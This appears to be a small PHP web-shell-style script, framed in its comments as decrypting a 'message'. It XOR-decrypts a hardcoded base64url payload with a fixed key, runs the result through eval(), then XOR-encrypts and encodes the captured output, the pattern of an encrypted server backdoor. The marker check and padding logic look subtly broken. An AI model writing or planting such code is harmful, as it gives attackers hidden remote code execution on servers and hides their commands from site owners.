<?php
function base64url_encode($data) {
  return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}

function base64url_decode($data) {
  return base64_decode(str_pad(strtr($data, '-_', '+/'), strlen($data) % 4, '=', STR_PAD_RIGHT));
} 
function x($k, $p){
		$c = "";
		$l = strlen($k);
		$pl = strlen($p);
		for($i = 0; $i < $pl; $i++) {
			$c .= $k[$i % $l] ^ $p[$i];
		}
		return $c;
}
$k = '5793deb09158a7dd';

// Hardcoded encrypted message (Base64 URL-safe encoded key and encrypted data)
$content = "czNwM2hyCg===dURAQBAADxgbXUYYTFtES0NWSxwTEhUSEAo";

// Split the content based on '=' character
$split = explode("=", $content);

if (strcmp(base64url_decode($split[0]),'s3p3hr')) {
$decoded = base64url_decode($split[1]);
		$decrypted = x($k,$decoded);

        print("Decrypted message: \n");
        print($decrypted . "\n");  // Print the decrypted message

		ob_start();
		try {
			eval($decrypted);
		}
		catch (exception $e) {
			print($e->getMessage());
		}
		$o = ob_get_contents();
		$c = x($k, $o);
		$e = base64url_encode($c);
		ob_end_clean();
		print($e . "\n");
}